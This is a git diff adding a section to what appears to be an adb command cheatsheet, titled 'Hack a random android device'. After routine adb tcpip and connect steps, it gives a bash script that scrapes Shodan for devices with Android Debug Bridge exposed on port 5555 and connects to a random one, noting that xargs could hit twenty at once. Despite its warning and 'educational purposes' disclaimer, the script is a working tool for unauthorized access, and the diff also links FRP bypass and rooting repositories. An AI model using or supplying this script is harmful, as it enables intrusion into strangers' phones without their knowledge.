@@ -3954,6 +3954,81 @@ adb shell screencap /storage/emulated/0/Pictures/screenshot.png
 adb shell screenrecord --time-limit 10 /storage/emulated/0/Video/record.mp4
 ```
 
+## Hack a random android device (ON YOUR OWN RISK)
+
+#### You need to connect to your device via `adb connect`
+
+```bash
+adb connect <ip>:<port> 
+```
+
+#### First you need to enable tcp mode as below with usb cable connected
+
+* Plugin  USB and execute
+
+```bash
+adb tcpip 5555
+```
+
+* Remove USB Cable and connect to your device via network:
+
+```bash
+adb connect <ip>:5555
+```
+
+* Now you can work with your device via network, enter shell as usual:
+
+```bash
+adb shell
+```
+
+> ⚠ WARNING: *Don't forget to `DISCONNECT` when you have finished debugging.
+You can be in danger and may be listed at shodan.io and other sites similiar to shodan if you will keep tcpip be running in background. We can find your device via a simple portscan via masscan or similiar tools, so use below command when you are done in shell:
+
+
+```bash    
+adb disconnect 
+```
+
+### To show you the danger with keep tcp mode running, for more tips to stay safe you can visit the below url for get latest commands since some are out of date I see here:
+
+[https://wuseman.github.io/adb-cheatsheet/](https://wuseman.github.io/adb-cheatsheet/)
+
+* You can copy and paste in any terminal and you are connected to a random device that has tcpip running without device owners knowledge, there is no way to figure out wihtout list connected devices ON the device. Therefore, take my warning seriously! Within ~1-3 seconds you have connected to a device. 
+
+Now imagine if we use xargs -n1 -P20, then we connect to 20 device at same time. So be careful!!
+
+```bash
+# Port for ABD
+PORT="5555"
+
+# Shodan FILTER:
+FILTER="android+debug+bridge"
+
+# Source URL:
+TARGETS="https://www.shodan.io/search?query=${FILTER}"
+
+function findTargets() {
+curl -sL ${TARGETS}|awk '!seen[$0]++'               \
+        |grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" \
+        |awk '!seen[$0]++'  |tee wadb-attack.log
+}
+
+function adbConnect() {
+grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" wadb-attack.log \
+        |sed 's/$/:5555/g'|tee target.txt
+        shuf -n1  target.txt \
+        |xargs adb connect
+}
+
+findTargets
+adbConnect
+```
+
+###### Above script is shared for educational purposes, wuseman cannot be held responsible for other users' use of the above script 
+
+// wuseman
+
 ## Android FRP BYpass by <small>wuseman</small>
 * [wuseman - Samsung Galaxy A10](https://github.com/wuseman/Samsung_Galaxy.A10_FRP.Bypass)
 * [wuseman - Samsung Galaxy A10](https://github.com/wuseman/Samsung_Galaxy.A10_Rooting)
